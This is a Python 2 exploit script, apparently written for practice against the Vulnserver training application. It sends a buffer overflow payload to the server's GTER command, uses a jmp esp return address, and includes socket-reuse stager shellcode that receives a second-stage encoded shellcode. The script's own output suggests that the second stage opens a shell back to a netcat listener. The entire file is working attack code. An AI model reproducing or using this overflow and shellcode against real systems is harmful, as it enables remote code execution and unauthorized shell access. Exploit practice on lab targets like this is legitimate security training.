# Code adapted from https://github.com/kartone. Original author: Kartone

#!/usr/bin/python

import socket
import os
import sys
import struct
from time import sleep

host = "192.168.43.50"
port = 9999

size = 174
eip_offset = 151

# Badchar \x00
# 0x625011df : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (c:\Users\kartone\Desktop\vulnserver-master\essfunc.dll)
# Call to recv => CALL 0040252C


# SocketReuse to receive 2nd stage
#   54               PUSH ESP
#   59               POP ECX
#   66:81C1 8801     ADD CX,188
#   83EC 50          SUB ESP,50
#   33DB             XOR EBX,EBX
#   53               PUSH EBX
#   33D2             XOR EDX,EDX
#   80C6 02          ADD DH,2
#   04 7C            ADD AL,7C
#   50               PUSH EAX
#   FF31             PUSH DWORD PTR DS:[ECX]
#   B8 AA2C2540      MOV EAX,40252CAA
#   C1E8 08          SHR EAX,8
#   FFD0             CALL EAX



shellcode  = "\x54\x59\x66\x81\xC1\x88\x01"
shellcode += "\x83\xEC\x50\x33\xDB\x53\x33"
shellcode += "\xD2\x80\xC6\x02\x52\x04\x7c\x50\xFF\x31"
shellcode += "\xB8\xAA\x2C\x25\x40\xC1\xE8\x08\xff\xd0"

nop_align = "\xcc" * 3

buffer  = ""
buffer += nop_align
buffer += "\x90" * (eip_offset - len(buffer) - 74)
buffer += shellcode
buffer += "\x90" * 40
buffer += struct.pack('<L', 0x625011df)
# short jump could be used but I wanted to try another jump-style
buffer += "\xEB\x80" # PUSH ESP, POP EBX, SUB bl,155, jmp ebx
buffer += "\x41" # padding
#buffer += "A" * (size - len(buffer))

command = "GTER " + buffer

payload_size = 1000

scode =  ""
scode += "\xda\xd2\xba\x6d\x99\x58\x98\xd9\x74\x24\xf4\x5f\x33"
scode += "\xc9\xb1\x56\x31\x57\x18\x03\x57\x18\x83\xc7\x69\x7b"
scode += "\xad\x64\x99\xf9\x4e\x95\x59\x9e\xc7\x70\x68\x9e\xbc"
scode += "\xf1\xda\x2e\xb6\x54\xd6\xc5\x9a\x4c\x6d\xab\x32\x62"
scode += "\xc6\x06\x65\x4d\xd7\x3b\x55\xcc\x5b\x46\x8a\x2e\x62"
scode += "\x89\xdf\x2f\xa3\xf4\x12\x7d\x7c\x72\x80\x92\x09\xce"
scode += "\x19\x18\x41\xde\x19\xfd\x11\xe1\x08\x50\x2a\xb8\x8a"
scode += "\x52\xff\xb0\x82\x4c\x1c\xfc\x5d\xe6\xd6\x8a\x5f\x2e"
scode += "\x27\x72\xf3\x0f\x88\x81\x0d\x57\x2e\x7a\x78\xa1\x4d"
scode += "\x07\x7b\x76\x2c\xd3\x0e\x6d\x96\x90\xa9\x49\x27\x74"
scode += "\x2f\x19\x2b\x31\x3b\x45\x2f\xc4\xe8\xfd\x4b\x4d\x0f"
scode += "\xd2\xda\x15\x34\xf6\x87\xce\x55\xaf\x6d\xa0\x6a\xaf"
scode += "\xce\x1d\xcf\xbb\xe2\x4a\x62\xe6\x6a\xbe\x4f\x19\x6a"
scode += "\xa8\xd8\x6a\x58\x77\x73\xe5\xd0\xf0\x5d\xf2\x61\x16"
scode += "\x5e\x2c\xc9\x77\xa0\xcd\x29\x51\x67\x99\x79\xc9\x4e"
scode += "\xa2\x12\x09\x6e\x77\x8e\x03\xf8\xb8\xe6\x3f\xe4\x50"
scode += "\xf4\x3f\x05\xfd\x71\xd9\x75\xad\xd1\x76\x36\x1d\x91"
scode += "\x26\xde\x77\x1e\x18\xfe\x77\xf5\x31\x95\x97\xa3\x6a"
scode += "\x02\x01\xee\xe1\xb3\xce\x25\x8c\xf4\x45\xcf\x70\xba"
scode += "\xad\xba\x62\xab\xc9\x44\x7b\x2c\x7c\x44\x11\x28\xd6"
scode += "\x13\x8d\x32\x0f\x53\x12\xcc\x7a\xe0\x55\x32\xfb\xd0"
scode += "\x2e\x05\x69\x5c\x59\x6a\x7d\x5c\x99\x3c\x17\x5c\xf1"
scode += "\x98\x43\x0f\xe4\xe6\x59\x3c\xb5\x72\x62\x14\x69\xd4"
scode += "\x0a\x9a\x54\x12\x95\x65\xb3\x20\xd2\x99\x41\x0f\x7b"
scode += "\xf1\xb9\x0f\x7b\x01\xd0\x8f\x2b\x69\x2f\xbf\xc4\x59"
scode += "\xd0\x6a\x8d\xf1\x5b\xfb\x7f\x60\x5b\xd6\xde\x3c\x5c"
scode += "\xd5\xfa\xcf\x27\x96\xfd\x30\xd8\xbe\x99\x31\xd8\xbe"
scode += "\x9f\x0e\x0e\x87\xd5\x51\x92\xbc\xe6\xe4\xb7\x95\x6c"
scode += "\x06\xeb\xe6\xa4"


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

print "[+] Connecting to the server..."
s.connect((host,port))
print s.recv(1024)
print "[+] Sending evil payload..."
s.send(command)
print "[+] Sending second payload..."
sleep(2)
s.send(scode)
print "[+] Second payload sent! Check your netcat..."
print s.recv(1024)
s.close()
